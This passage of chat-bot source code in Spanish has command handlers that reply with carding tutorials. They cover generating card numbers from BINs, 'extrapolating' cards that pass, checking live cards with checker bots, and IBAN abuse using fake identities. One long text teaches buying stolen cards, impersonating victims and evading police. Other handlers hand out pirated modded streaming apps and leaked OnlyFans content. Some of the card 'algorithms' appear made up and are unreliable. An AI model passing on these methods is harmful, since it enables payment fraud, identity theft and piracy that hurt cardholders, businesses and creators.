Bueno, esto es depende de donde sea el bin. Hay bins que jalan en una sola pagina ejemplo (crunchyroll) y hay otros que son multifuncionales ejemplo (crunchyroll, mubi, Napster y entre otras).

Posdata: solo tome esas páginas para el ejemplo.

✅ ¿COMO GENERAR UNA CC CON UN BIN?

existen varios generadores de ccs
que se encargan de remplazar las “x” por números que coincidan
con una cc.

El generador que yo usaré será Namso (https://namso-gen.com/)

INSERTE SU BIN: 548572xxxxxxxxxx

Y señalamos Fecha & CCV2 (si es todo generado)

Cantidad a crear 10 o las que quieran

Y le damos generar tarjetas.

✅ ¿QUE ES CHAVELO?

Se le denomina “Chabelo” a un bin que pese a que es viejo sigue funcionando en varias páginas.

✅ ¿Corremos riesgo al utilizar un bin?

Los BINS no son tan peligrosos, con la acción de “binear”, solo se estafa a la empresa en donde la usaste la cc generada.

Las tarjetas no son de dueños reales, solo son algoritmos, que de alguna manera pasan en una
página.

Lo más malo que te puede pasar, es que una página bloquee tu IP real permanentemente o tu dispositivo.

La otra cosa, es que tu IP puede estar en una lista negra de SPAM, eso es
provocado usualmente por VPN’s como Hola que vende este tipo de datos de sus usuarios a otras compañías, lo cual es algo que Hola no te especifica. Igual, hay muchos mejores VPN’s .

Es muy raro que pase, binear no es peligroso, si es que no abusas o llegas a un extremo muy pero muy elevado.

✅ ¿Qué es BAN?

Seguramente en los diversos grupos has escuchado esto, literalmente Ban significa prohibir esto es que se te pone una restricción; ya sea total, parcial, temporal o permanente, al sitio en donde has realizado la compra.

✅ ¿QUE ES UN VPN?

Una red privada virtual (RPV).
En inglés: Virtual Private Network (VPN), en pocas palabras VPN es algo que ayuda a que tu verdadera direccion IP quede cubierta, por ejemplo si tu eres de Argentina y un bin pide IP de Rusia, deberemos descargar un VPN como Tunnelbear para cambiar nuestra direccion a alli, los VPNs son faciles de usar y son una parte fundamental para usar bins, sin ellos no podremos usar la mayoria de ellos.
Existen varios vpns algunos son de paga, y otros gratuitos como Vyprvpn y tunnelbear entre otros. ZeroVPN, VyprVPN, TunnelBear, Hotspot Shield, HMA.

✅ ¿QUE ES IP?

IP = Internet Protocol, o simplemente tu dirección de Internet, todos nuestros dispositivos
conectados a internet poseen uno otorgado gracias a la red a la que estamos conectados. La IP en
algunos casos puede señalar la locación exacta en la que estamos ubicados.

✅ ¿QUE SON LIVES?
Las lives son tarjetas de crédito aprobadas por el mercado, es decir, tienen fondos. Estás sirven para hacer el pago con más seguridad.

✅ ¿QUE ES EXTRAPOLACIÓN?
Extrapolar es cuando sacamos un bin a partir de una tarjeta de credito existente, por ejemplo:

3764010x5xxx03x
37640101x526xxx
3764010xx5x6xx7
3764010xxx2xxx7

✅ ¿CÓMO EXTRAPOLAR UNA ‘CC’ GENERADA A PARTIR DE UN BIN?

Esto sirve para que vuelva a funcionar la tarjeta generada que utilizaste, es muy importante que la guardes, para que le vuelvas a dar una utilidad y disfrutar de ella. Tienes un bin, por ejemplo: 531321xxxxxxxxxx (Deezer Jalando), y con base a éste, generas un par de tarjetas. A partir de que generas dejan de llamarse bins y pasan a ser
tarjetas de crédito. Escoges una al azar por ejemplo: 5321321654829183

Te vas a la pagina de deezer y al registrar dicha tarjeta que hayas escogido, pasa al primer intento para crearla, pero después de un tiempo no funciona el bin.

Lo que haremos será extrapolar la tarjeta que pasó a la primera al crear la cuenta.

Lo haremos (extrapolar), eliminando los últimos 6 digitos de la tarjeta, Ejemplo: teníamos esta: 5321321654829183 y ahora pasa a ser esto:

5313216568xxxxxx

Generas de nuevo para calar en deezer y ya esta, volvió a pasar.`)
                  }
					
		if (budy.includes(`/extrapolar un bin`)) {
                  reply(`⚜ ¿QUE ES EXTRAPOLACIÓN? ⚜

Extrapolar es cuando sacamos un bin a partir de una tarjeta de credito existente, Por Ejemplo:

3764010x5xxx03x
37640101x526xxx
3764010xx5x6xx7
3764010xxx2xxxxx

Hay 3 métodos de extrapolación: básica,  y avanzada.

🔰 𝗕𝗔𝗦𝗜𝗖𝗔:

Consiste en 2 tipos de extrapolación:

Similitud. 
Activación.

✅ ACTIVACIÓN

Simplemente tomas una tarjeta Generada con tu bin carbon y cambias los ultimos 6 digitos por la letra 𝘅

Ejemplo:

Tarjeta Usada: 5292202302315781

Resultado: 5292202302xxxxxx 

✅ SIMILITUD

Requiere tener 2 CC del mismo BIN, que son:
 
T1: 5292203820803126
T2: 5292207483033368

Debemos separar los 6 primeros números de la CC:

[529220] [3820803126]
[529220] [7483033368]

Y, se van a fijar en el segundo grupo:

[3820803126] y [7483033368]

Después, van a comprobar SIMILITUDES entre estos dos, es decir, vas al segundo grupo que se separó:
 
[3820803126]
[7483033368]

Ordenarlas de este modo, y después, comparar.Si tienen el mismo número, se quedan iguales, si no, se reemplazan por una X, es decir:

T1: [3820803126]
T2: [7483033368]

Quedaria asi: [xxxxxx3xxx]

Ahora, juntas el bin con tu resultado: 

New Bin: 529220xxxxxx3xxx

Y ese es tu nuevo bin extrapolado

🔰 𝗔𝗩𝗔𝗡𝗭𝗔𝗗𝗔:

Esta es una compleja, pero muy buena para generar lives.
Muy poca gente la conoce, ya que esta fue extraída de el software de generación de tarjeta SoFlA de un banco b10*sum:

T1: 5292208177212441 
T2: 5292204657663815 

Para este método, debemos usar únicamente los 10 dígitos de dos CCs. 
Pero, como hago si las CCs tienen diferentes números? 
Bueno. Del tercer grupo, solo se usarán los 2 números de la tarjeta.

5292 2081 x72x xxxx 
5292 2081 x76x xxxx

Se suman

7+2= 09 
7+6= 13
 
A partir de estos resultado, se divide el número entre 2: 

7+2= 09÷2=4.5 
7+6= 13÷2=7.5 

Después, se multiplica por 5. 

7+2= 09÷2=4.5=22.5 
7+6= 13÷2=7.5 =37.5 

Si existe un decimal (.) y el número es de dos cifras, se borra el decimal. 

Y el resultado se suma: 

22+37 =59 

Así que terminaria:
 
5292 2081 59xx xxxx

✅ INDENTACION LOGICA:

5292208177212441
 
Debemos separar los 6 primeros números de la CC:

[ 529220] [8177212441]

Y, se van a fijar en el segundo grupo

[8177212441]

Después, este grupo lo deben separar en modo (3-4-3), es decir: 

[817] [7212] [441]

Y, eliminan el número central: 

[8x7] [7xx2 [4x1] 

Después, ordenan el BIN con el resto: 

Resultado Final: 5292208x77xx24x1

✅ MATERIALDINVERTER

Este es algoritmo privado el cual afecta a las tarjetas generadas después de mediados del 2017, fue tomado del software SoFlA del Banco de Bogotá. 

Este es el mas, mas complejo de todos y tiene un 100% de seguridad de sacar lives si lo usas bien. 

Este método requiere 2 CCs, las cuales comúnmente son expedidas entre Octubre 2016 a Febrero 2017. 
Así que:

T1: 5292208177212441 
T2: 5292204657663815

Tienes que separar T1 y T2 en 2 grupos de 8 digitos 

T1:[52922081 [77212441 
T2:[52922046 [57663815 

Ahora, vas a agarrar T2 y vas a ordenarlo del siguiente orden para poder multiplicarlo 
5×5= 25 
2×7= 14 
9×6= 54 
2×6= 12 
2×3= 6 
0×8= 0 
4×1= 4 
6×5= 30 

Vas a escribir cada resultado en una línea pegado: 
2514541260430

Como pueden ver, hay 13 números, debemos hacer que sean 8, así que borramos los últimos 

5 para que nos queden 8 que serían: 

Nos queda: 25145412 

Ahora, vamos a pegar el primer grupo con nuestro resultado: 

=5292204625145412 

Ahora, vamos a realizar extrapolación basica, similitud entre T1 y el resultado, por eso, separamos: 

T1: 5292208177212441 

R1: 5292204625145412 

Nuestro resultado seria: 529220xxxxxxx4xx 

Ahora, si el último dígito termina siendo una X, este se reemplaza por 1 

El resultado final sería: 529220xxxxxxx4x1`)
                  }

		if (budy.includes(`/verificar un bin`)) {
                  reply(`Bueno geys. En esta oportunidad les enseñare a Verificar su BIN
Primero necesitaremos un BIN. La ves pasada les enseñe como sacarlo xd.

Para ahorrar toda esa clase usaremos al bot del grupo, bueno una ves obtenido el BIN ( 410453 ). 

Luego nos dirigimos a https://www.bincodes.com/bin-checker/

Una ves abierta la pagina. Buscamos el apartado Bank Identification o en español ( Número De Identificación ).Y ahi colocaremos nuestro BIN ( 410453 )

Ahora tendremos que validar,completar el Captcha.

Una ves hecho esto, damos clic en la opción CHEQUE.

Esperamos unos minutos y nos saldra la información de nuestro BIN.

Resultado de la validación de BIN

410453 es un BIN válido.

Detalles del BIN

COMPARTIMIENTO: 410453

Banco emisor: KEMBA CREDIT UNION, INC.

Marca de carro: VISA

Tipo de tarjeta: CRÉDITO

Nivel de tarjeta: CLÁSICO

Nombre de país: ESTADOS UNIDOS

BY: @JOSEPHBINERO`)
                  }

		if (budy.includes(`/que es live`)) {
                  reply(`-Una live es una Cc que será aprobada en el lugar de donde es el bin

Una live igual es una cc que tiene fondos.

¿Cómo sacar una live?

Las Lives se pueden sacar de diferentes maneras

1- Una live se puede sacar desde un bot de Telegram ya sea gratuito o de paga, esos son los checkers spam [Anti Spam]

2- Otra forma de sacar una Live es comprando un checker web, esos son checkers que no tienen [Anti Spam] y puedes cargar varias ccs sin necesidad de esperar un molesto [Anti Spam]

¿Qué es un checker y cuanto valen?

-Un checker es un sistema el cual se encarga de verificar que una cc está live

-El precio de un checker varía de cada dueño del checker

¿Qué es un Gate? Un Gate es un lugar especifico para meter una cc, existen varios tipos de Gate como:

-Multigata

-CVV gate

-CCN GATE

¿Qué es CCN Y CVV?

-Una CCN es una cc que tiene correcto los 16 dígitos y la fecha correcta pero el código de seguridad es incorrecta

-Una CVV es una cc que tiene todo correcto

¿Para qué sirve una CVV?

La CVV sirve para hacer compras físicas u comprar algún servicio sin riesgo a que el mismo se caiga a las semanas o días.`)
                  }

		if (budy.includes(`/carol bot checker`)) {
                  reply(`💢》 ¿Como se usa Carol Bot?

🍿| Bueno gente primero ingresamos al Bot : @Carol5_bot
ahora ponemos en iniciar , bueno aca tienen que poner la targeta con los datos pero antes el comando    /ch y despues la targeta , esperas algunos segundos y listo , te sale si es live o no , si marca una X significa que no vale  si marca una ✅ es que la targeta si vale , haslo cada 30 segundos

🔧| Bot para sacar lives : @Carol5_bot`)
                  }
					
		if (budy.includes(`/iban`)) {
                  reply(`⚠️| Método Iban.

Bueno chicos hoy les voy a enseñar un metodo sencillo que puede sacarlos de un apuro, se llama Iban o Sepa...

¿Y que es esto?

El International Bank Account Number "Código Internacional de Cuenta Bancaria" en su traducción al español, es un código alfanumérico que identifica una cuenta bancaria determinada en una entidad financiera en cualquier lugar del mundo. 
Es decir, a cada cuenta le corresponde un único IBAN mediante el cual se identifica el país, la entidad, la oficina y la cuenta. 
Se trata de un estándar del Comité Europeo de Estándares Bancarios, que a su vez cumple con el estándar ISO 13616.

A continuación les mostrare una lista de países que usan este metodo (esta actualizada así que aprecienlo)

Caracteres Albania [🇦🇱]~[28]: AL35202111090000000001234567     
  Caracteres Andorra [🇦🇩]~[24] AD1400080001001234567890  
Caracteres Azerbaiyán [🇦🇿]~[28] AZ96AZEJ00000000001234567890         
 Caracteres Bahréin [🇧🇭]~[22] BH02CITI00001077181611  
Caracteres Bélgica [🇧🇪]~[16]
BE71096123456769  
Caracteres Bosnia [🇧🇦]~[20]: BA275680000123456789 
Caracteres Brasil [🇧🇷]~[29]: BR1500000000000010932840814P2          
 Caracteres Bulgaria [🇧🇬]~[22]:
BG18RZBB91550123456789 
Caracteres Costa Rica [🇨🇷]~[22] CR37012600000123456789  
Caracteres Dinamarca [🇩🇰]~[18]: DK9520000123456789 
Caracteres Alemania [🇩🇪]~[22]: DE91100000000123456789  
Caracteres Salvador [🇸🇻]~[28]:
SV43ACAT00000000000000123123     
 Caracteres Estonia [🇪🇪]~[20]:
EE471000001020145685    
Caracteres Finlandia [🇦🇽]~[18]:
FI1410093000123458  
Caracteres Francia [🇨🇵]~[27]: FR7630006000011234567890189   
  Caracteres Georgia [🇬🇪]~[22]:
GE60NB0000000123456789   
Caracteres Polonia [🇵🇱]~[28]:
PL10105000997603123456789123  
  Caracteres Portugal [🇵🇹]~[25]:
PT50002700000001234567833  
Caracteres Rumania [🇲🇩]~[24]:
RO09BCYP0000001234567890  
Caracteres Suiza [🇨🇭]~[21]:
CH5604835012345678009 
Caracteres Serbia [🇷🇸]~[22]
RS35105008123123123173    
Caracteres Eslovenia [🇸🇮]~[19] SI56192001234567892`)
                  }
					
		if (budy.includes(`/iban`)) {
                  reply(`⚠️| Método Iban Parte ²

~Basicamente esa es la teoría de que es Iban 😛.

¿Para que funciona?

•Se utiliza como metodo alternativo al Bin, ya que puede que funcione de diferente manera en paginas destinadas a otros servicios como es el caso mas común con Napster.
 Su uso puede varias, ya es cuestión de ustedes Intentar.

Iba a utilizar Napster para enseñarles, pero Alemania fue baneada de sus servidores así que no funciona Pero no se preocupen cualquier pagina con un dominio Aleman o de los países anteriormente mostrados servira.

¿Que necesitamos para este metodo?

[✓] VPN activado en Alemania (puede que funcione cualquier VPN pero recomiendo uno como HMA).

[✓] Entrar en la página fake-it.ws y seleccionar la Bandera de Alemania.

[✓]  Intentar en sitios que acepten este tipo de pago. 

[1️⃣] En primer lugar con nuestro VPN Activado, ingresamos a fake-it.ws

[⚠️] Chicos las identidades falsas son clave en este mundo. 

[⚠️]Algunas paginas piden minimo algo de relación entre nombre y vivienda

[⚠️] Incluso numero de celular, que aunque no lo verifiquen puede llegar a molestar buscarlo.

[✓] Así que usen fake-it.ws

[✓] La interfaz de la pagina es bastante intuitiva,fácil de entender y usarla.`)
                  }
					
		if (budy.includes(`/carding límite`)) {
                  reply(`Tutorial Carding Avanzado

Necesitas dinero para ganar dinero. Simple y claro.
Lo que significa que es la unica forma que usted va ser capaz de conseguir CCs.
Si usted no tiene dinero es imposible que pueda obtener CCs, si usted es tiene 100 tarjetas tendra exito. (Pero qué novato tiene 100 tarjetas)?
amenos que si usted tiene algún acceso la base de datos de datos de una empresa o si usted conoce alguien que esta dispuesto a darle ccs todo el dia
Sé que es una declaración desalentadora para todos ustedes, pero tenemos que mantener ** realista. La forma más fácil de
Obtener ccs es comprarlos
"Pero no puedo conseguir un trabajo / no quiero trabajar!"

Tener un trabajo regular de 9 a 5 no es una mala idea en la escena de carding. No sólo tendrás algún tipo de coartada
A por qué tienes todo esto gatito caro en tu casa, pero también puedes usar el dinero (que no puede
Hoy en día) para pagar las facturas. Usted no puede tarjeta para siempre, y usted no puede sostenerse por cardar solo.
Porque usted tendra todo esto caro en su casa pero también debe utilizar dinero (que no puede hoy en dia) para pagar sus facturas. Usted no puede usar tarjetas para siempre y
[HIDE-REPLY] usted no puede sostenerse con solo cardear.
si usted esta realmente atado con correa para el efectivo, usted también que ir con la alternativa: El comercio para sus recursos(Negociar con otras personas en este arte del carding). Tu tienes que ser ingenioso para el carding, lo que significa que tienes que usar lo que tienes.
¿Tienes una cuenta de administrador de psybnc?
Ofrezca al usuario psybnc una o dos. ¿Puede hacer llamadas de verificación? Solo preguntate
"¿Qué tengo que pueda ser valioso para otra persona?" Y trabajar con eso. No tiene que ser grande, solo
Tiene que conseguir ccs en sus palmas.
Una vez que haya obtenido su primer cosa cardeada con CC, no gaste todas sus ganancias. Ahorre y vuelva a invertir de vuelta.

"¿Dónde puedo comprobar mi CC?"
Saber si su cc es válido o no es realmente importante para ahorrar algo de tiempo y energía.Puede hacern en un sitio de verificación,
se puede comprobar bajo hxxp: //www.sinfulcherries.com/? Aid = 525390.
La forma de la idea para comprobar ccz es a través de un comerciante en línea (authorize.net, linkpintcentral.) Estos
comerciantes pueden verificar las cantidades de cc sin cobrar sus ccs. Buena suerte para encontrar uno.

Otros métodos para verificar las cc es registrar su cc en un banco en línea. (Usted necesitará al menos
Una tarjeta de nivel 2, nivel 3 para tarjetas ATM). Un montón de bancos en línea puede darle límite, facturación addy, etc ectc pero que
Requieren por lo menos un nivel 2 cc (más información en de la cc)

TARJETA DE CRÉDITO FRAUDE: LA INFORMACIÓN ES CLAVE.

Quiero dejar algo claro ahora mismo. El secreto de la tarjeta no es el número de tarjetas que posee, sino
Qué puedes hacer con las tarjetas. ¿Qué quiero decir con eso? Sencillo.
Hipotetica situación

Mi nombre es Johnny y tengo 3 ccs con SSN, DOB, CVV NUMBER, MMN, NAME,
DIRECCIÓN DE LA CALLE, CIUDAD, ZIP, Y NÚMERO DE TELÉFONO, DIRECCIÓN FACTURACIÓN.
Tengo un amigo llamado Billy. Billy tiene 300
CCCZ con CVV, MMN, NOMBRE, DIRECCIÓN DE CALLE, CIUDAD, ZIP, Y FACTURACIÓN TEL. NÚMERO. ¿Quién es más probable?
Para la tarjeta de éxito algo?
En pocas palabras, yo (Johnny) am. ¿Por qué? Porque tengo más información que puede probar que soy la persona que
Posee este CC que Billy sus 300 CCVZ. ¿Eso significa que Billy no va a cardear nada? no,
Sólo significa que Billy va a tener dificultades para cardear cualquier cosa sin verificación.

Así que para resumir esta lección, usted tiene que obtener información sobre su victima (la persona que está suplantando.)
# 1 regla en el cardado es: cuanto más información que tiene sobre una persona, las mejores posibilidades que tiene para un
Transacción exitosa.

Aquí está la información que estás buscando (nota: los niveles de una tarjeta no es un término de carding técnico, yo sólo he usado NIVEL 1,2,3 para simplificar ** a lo largo del tutorial.):

(NIVEL 1: CVV REGULAR) Si usted tiene esta información, usted tiene un cc regular.
NOMBRE:
DIRECCIÓN:
CIUDAD:
ESTADO:
CÓDIGO POSTAL:
TEL. NÚMERO DE FACTURACIÓN:
NÚMERO DE TARJETA:
TARJETA EXP DATE:
CODIGO CVV:
Esta información sirve mucho para cardear algo muchas veces, vale la pena mencionar. Si usted tiene menos que esta información.
Número de Seguro Social (SSN):
Fecha de Nacimiento (DOB):
Nombre de soltera (MMN):

NIVEL 2: (PARCIAL FULL-INFO) Si usted tiene esta información, su ccs están en otro nivel
Con esta información, Usted debe ser capaz de cardear PayPal, C2IT, y otros sitios sin demasiado de un h * le.)
NÚMERO DE CUENTA BANCARIA:
NÚMERO DE RUTA:
NOMBRE DEL BANCO:
NÚMERO DE BANCO:
NÚMERO DE CARNET DE CONDUCIR:
NÚMERO DE PIN (Para la tarjeta CC o ATM)

Nivel 3:
Si tiene esta información, tu CC está listo para cualquier cosa que su corazón desee
Ahora si todo lo que tienes es un cc regular, no desanimarse, también son muy utiles.

SEGURIDAD, ANONIMATO

La seguridad es clave. Nadie quiere dar a los federales la satisfacción de revolvernos y cerrar
Producción, por lo que tenemos que permanecer tan anónimo como sea posible.
Primero déjeme empezar diciendo que no se puede 100% de protegerse. No dejes que la gente te engañe pensando eso.
Usted puede estar detrás de todos los proxies, wingates, Socks, y cualquier otra cosa en el mundo, pero deja "digital
Huellas dactilares" donde quiera que vaya.

Para mis beneficios personales, uso un ISP combinado con un anonymizer
Cuenta (www.anonymizer.com) y un nivel 1 proxy. Pero no lo recomiendo para todo el mundo.
Www.anonymizer.com: ofrece excelentes servicios para aquellos que quieren permanecer anónimos.
Es un servicio y como cualquier otro servicio prestado, usted tiene que pagar por el uso

El único problema del servicio es que tienen algunos problemas con los sitios que utilizan Applets de Java, lo que significa que podría tener que
Saltar en algunos de los principales sitios que requieren JAVA.
Usted puede también obtener proxies gratis de www.anonymitycheker.com/page1.htm este es un sitio de descenso que clasifica los Proxies de "transparente" (filtra su ip) a "altamente anónimo". También realizan pruebas de proxy en tiempo real y
Otros **.

Stealther:
Este Programa se llama Stealther. Stealther puede ser registrado vía Key (así que usted puede ir a #serialz en efnet y conseguir una
Clave) y es un programa anónimo de descenso.

EvidenceEliminator: Si usted es realmente serio sobre cardear, éste es un programa que usted NECESITA haber instalado, encender Su HD en TODOS LOS TIEMPOS! Los agentes federales tienen varios programas que les permiten extraer información de
Su PC, como las páginas que ha visitado, los archivos que ha eliminado y los correos electrónicos que ha escrito.
Cada vez que su PC se reinicia, EE entra en acción, lo que le proporciona la seguridad de borrar cualquier registro de testigos e historial
Archivos. Siempre quieres estar preparado para lo peor.

JAVA: siempre asegúrese de desactivar JAVA en su navegador.
CARDED ISP: No sé si la tarjeta de un ISP es seguro o no. He oído comentarios mezclados sobre esto. Sin embargo,
Puedo atestiguar que he tenido experiencia con tal asunto y yo nunca he tenido un problema hasta ahora.

Estos no son los únicos métodos de sigilio, estos son sólo los más populares. Si usted siente que tiene
Un método de anonimato que funciona, por todos los medios probarlo. Nunca se sabe qué funciona hasta que
Usted experimenta.
Si usted necesita saber si esta usted anonimo realmente, hay algunas maneras simples de probar esto.
Www.whatismyip.com: la primera prueba (y la más básica) que debe tomar. Whatismyip.com es un método simple de
Saber sobre su IP en la web.

www.multiproxy.org/env_check.htm: esto es una comprobación básica de su nivel de anonimato. Debe tener JAVA
Habilitado - el verdadero propósito del sitio es promover su software (multiproxy)[/HIDE-REPLY]

🛍 De regalo les dejo esto :3

🔱 @BineriaUniversal

https://mega.nz/folder/3BNWVZRb#ZfEyVq_H16dkc-08NggSnw`)
                  }
					
					
	if (budy.includes(`/termux`)) {
                  reply(`📱TERMUX📱

Si eres nuevo en este mundo de la informática y el hacking, debes estar pensando... ¿Cómo empezar en este mundo?
Debido a que muchas personas les interesa este mundo pero no saben como empezar, me he dado el trabajo de escribir esta pequeña guía sobre el uso de Termux para que aprendas a navegar en esta terminal de entorno linux disponible para los dispositivos android que tengan una versión android 5.0.1 o superior, cabe aclarar que Termux se encuentra disponible de forma gratuita en la Play Store así que no te preocupes por su instalación ya que es algo muy básico instalar aplicaciones de la Play Store.
También quiero aclarar que ésta pequeña guía está hecha en base a mis conocimientos y también está hecha para que los nuevos en este mundo puedan comprender su uso, es decir, no te voy a nombrar las características de Termux ni nada por el estilo ya que eso solo te confundiría al empezar y yo quiero que lo comprendas, mas no darte conceptos que no sabes que significan.
Antes de empezar, quiero que comprendas bien la respuesta a estas pequeñas preguntas:

📱¿Qué es Termux?📱

Termux es una terminal de entorno linux para dispositivos android, es decir, así como Windows, Kali Linux, Ubuntu, Parrot, etc... tienen su terminal de comandos, android también cuenta con una de ellas y ésta se llama Termux.
Esta terminal de comandos puede ser instalada sin la necesidad de realizar complicadas configuraciones, es decir, al instalar esta terminal en tu dispositivo android, ocupara muy poco espacio ya que ésta viene desde cero, no tiene instalado ningún paquete y tampoco tiene permisos de almacenamiento, todo tendrás que realizarlo tú de forma manual a medida que vayas avanzando. Termux avanza al igual que tú, así que esta terminal depende de ti, tú tienes el control, tú decides qué hacer con ella.
Comprendido todo ésto, te estarás preguntando...

📱¿Para qué sirve Termux?📱

Termux puede servir para realizar varias pruebas de hacking, como por ejemplo, hacking a redes sociales, redes Wi-Fi, páginas web, e incluso puede servir para programar, es decir, con Termux tendrás oportunidad de aprender a hackear y ver lo vulnerables que pueden ser las redes sociales, páginas web, routers, entre otras.`)
                  }
					
					
	if (budy.includes(`/gta san andreas`)) {
                  reply(`Acerca De:

Grand Theft Auto: San Andreas es un videojuego de acción-aventura de mundo abierto desarrollado por Rockstar North y publicado por Rockstar Games.

Link De Descarga:

https://www.mediafire.com/file/ln6r3kx0ie77r9t/GTA_San_Andreas_2021.zip/file`)
                  }
					
	if (budy.includes(`/annelids`)) {
                  reply(`Acerca De:

Annelids: Es un juego de acción y aventuras en el que nos veremos inmersos en medio de una guerra subterránea de gusanos armados. A través de esta original premisa, nos mantendremos enganchados a la pantalla de nuestro dispositivo Android mientras intentamos acabar con todos los enemigos.

Link De Descarga: https://play.google.com/store/apps/details?id=cz.gdmt.AnnelidsDemo&hl=es&gl=US`)
                  }
					
	if (budy.includes(`/deezer`)) {
                  reply(`Acerca De:

Deezer Music Player, Songs, Playlists & Podcasts: Es un reproductor de música, radio y podcast que seguro te encantará. Puede acceder a muchas canciones populares y gratuitas en diferentes países y encontrar sus canciones favoritas. Al mismo tiempo, a veces desea una experiencia de entretenimiento diferente, entonces puede buscar la función de escucha de radio y podcasts que brinda la aplicación. De hecho, la experiencia del usuario se verá satisfecha por muchos factores.

Link De Descarga: https://files.moddroid.com/Deezer/Deezer_6.2.31.68.6211404.apk`)
                  }
					
	if (budy.includes(`/netflix`)) {
                  reply(`Acerca De:

Netflix: Es una empresa de entretenimiento y un servicio por suscripción estadounidense que opera a nivel mundial y cuyo servicio principal es la distribución de contenidos audiovisuales a través de una plataforma en línea o servicio de video bajo demanda por streaming.

Link De Descarga (No Mood): https://play.google.com/store/apps/details?id=com.butacapremium.play

Link De Descarga (Mood 1): https://mega.nz/#!lFlEzI5S!nisjSAODd7v0qL4QXQIj0jNoqhkYJXqVDMkqqUrovWI

Link De Descarga (Mood 2): https://files.moddroid.com/Netflix/Netflix_SV4_v7.111.1.apk`)
                  }
					
	if (budy.includes(`/prime video`)) {
                  reply(`Acerca De:

Prime Video, también comercializado como Amazon Prime Video, es un servicio de videos disponible en retransmisión en directo, creado y gestionado por Amazon.com. La plataforma ofrece miles de títulos sin coste adicional a la afiliación mensual o anual a Prime Video

Link De Descarga (No Mood): https://gp.moddroid.com/Amazon%20Prime%20Video/Amazon%20Prime%20Video-3.0.300.8457.apk


Link De Descarga (Mood): https://files.moddroid.com/Amazon%20Prime%20Video/Prime_Video_3.0.298.12657_MOD_Viva.apk`)
                  }
					
	if (budy.includes(`/disney plus`)) {
                  reply(`Acerca De:

Disney Plus: Es un servicio de suscripción de vídeo a la carta en streaming propiedad de la división de Distribución de Medios y Entretenimiento de The Walt Disney Company y gestionado por la misma.​

Link De Descarga (No Mood): https://play.googleapis.com/download/by-token/download?token=AOTCm0RnPNDb4JLgYA9QX77sPeifys-oahQUNFSmRmXSh6c5nGSRfgcE5A2V5nTqNPUDrxTwU2K3BDAJ3Ru7kfvVbbLcFPlMqdYGq2w9syr0pwwndMJCyBTp1Ks6UVuhIdqrGHaV0iFN_6Cv8ab6tqkswpESSKiwP8NMZTISBjB97Fy3GrmjZy2Nye9ETJ33toVYe4IOjDEXwceki4_MSFF3teYRSzcPc5hw3VsqIXVpW5fOTXNTOZuA8GjCQCtWMTew51wKDEuCxuGWaoPXOxyqRuOz2SIDhkupSo0EfW07sZepLuUiG1hC9Y5rKuaRs1DPgpkL9HNdkGpNoz9oaxpWNcMeEzifXw8lpROFgMXisteGU22x3qCiXPaAeHaGvFpqkeAaibsOrlDWj59C8TwSBSyuEQ&amp;cpn=BM-U_rvyIO3DC0b9

Link De Descarga (Mood): https://file.hapmod.com/uploads/Disney-Plus-1.16.0-Mod-CoiMobile.Com.apk`)
                  }
					
	if (budy.includes(`/crunchyroll`)) {
                  reply(`Acerca De:

Crunchyroll: Es una empresa distribuidora, editorial, de producción y de licencias estadounidense centrada en la transmisión de anime, manga y dorama.

Link De Descarga (No Mood): https://play.app.goo.gl/?link=https://play.google.com/store/apps/details?id=com.crunchyroll.crunchyroid&ddl=1&pcampaignid=web_ddl_1

Link De Descarga (Mood): https://techbigs.com/download/mod/crunchyroll-premium-893-13785#`)
                  }
					
	if (budy.includes(`/viki rakuten`)) {
                  reply(`❌ SE PRODUJO UN ERROR. INTENTALO MÁS TARDE ❌`)
                  }
					
	if (budy.includes(`/onlyfans`)) {
                  reply(`Ultra Mega Pack

1 - Isabella Y Aída 
https://exe.io/IsabelOnly

2 - Jeniffer Ponce 
https://exe.io/JennfiponceOnly

3 - Tanza Mattel
https://exe.io/TanzaOnly


4 - Tessa
https://exe.io/TessaOnly

5 - Ferxiita
https://exe.io/FerxitaaOnly

6 - Angela White
https://exe.io/AngelaWiteOnly

7 - Lily Adrianne 
https://exe.io/LilyOnly

8 - Andyy Tok 
https://exe.io/AndyTokOnly

9 - Karina Rodríguez
https://exe.io/KarinaRodrigesOnly

10 - Angigss
https://exe.io/AngigssOnly

11. Victoria Matosa
https://exe.io/VictoriaMOnly

12. Luna Benna
https://exe.io/LunaBenmaOnly

13. Sky Wallace
https://exe.io/SkWallaceOnly

14. Dalma Vanesa
https://exe.io/DalmaVaOnly

15. Baby Selling
https://exe.io/BabySellinOnly

16. Hott4lexi 
https://exe.io/HottaLexiOnly

17. Jennifer Ponce
https://exe.io/JeniferPonceOnly

18. Viking Barbie
https://exe.io/VikingBarbieOnly

19. Juanita belle
https://exe.io/JuanitaBellaOnly

20. Lady dusha
https://exe.io/LadyDushaOnly

21. Lana rhoades
https://exe.io/LanaOnly

22. Seleneitor
https://exe.io/SeleneitorOnly

23. T.Y.G.A
https://exe.io/TygaOnly

24. Increíble😏🤭
https://exe.io/IncreibleOnly

25. Brutal🥵
https://exe.io/BrutalOnly`)
                  }
					
	if (budy.includes(`/canal de inmunes`)) {
                  reply(`╔═╦╗───────────╔══╗
║╔╣╚╦═╗╔═╦╦═╦╗─║═╦╩╦╦╗
║╚╣║║╬╚╣║║║╩╣╚╗║╔╣╬║╔╝
╚═╩╩╩══╩╩═╩═╩═╝╚╝╚═╩╝
╔══╗────────────╔═╗
╚║║╬═╦╦══╦╦╦═╦╦═╣═╣
╔║║╣║║║║║║║║║║║╩╬═║
╚══╩╩═╩╩╩╩═╩╩═╩═╩═╝

➣ 到 - ARCADIA MODS ϟ

https://m.youtube.com/channel/UCljRgCGtjvlPcEqvw5jsA7A

➣ Beto a.m.g Tutoriais

https://m.youtube.com/channel/UCTRms5xeyZezhGZQ8LDOotQ

➣ Castillo OFC

https://m.youtube.com/channel/UCScibil7BzjEpjZK-jZkTrw

➣ 岌~THE ZEUS_YT卐

https://m.youtube.com/channel/UCZvfahHM_N_6Pi5tZK_i31Q

➣ KrazModder

https://m.youtube.com/channel/UC_VBfeDcgZkPZ5x6n3uUmhQ

➣ THE NILF

https://m.youtube.com/channel/UCo74LtnVg35Wm80Hfs0bZtQ

➣ REALITY OFC

https://m.youtube.com/channel/UC9U-569ecvLihT_6iXROG-g

➣ MaLz 41

https://m.youtube.com/channel/UC-1YnvlNc6Y4QTzZ9STrWIA

➣ SS MODS❶☇

https://m.youtube.com/channel/UC9EV0BMByKr-zFDXTE4ERlQ

➣ KING DARK MODS. WA

https://m.youtube.com/channel/UCL9q-_s0yWBSewdCEKNo6xA

➣ Night Dynasty

https://m.youtube.com/channel/UCM4jlmc1fX-ZVRw3ex3VGNQ

➣ De momento un morro weyon

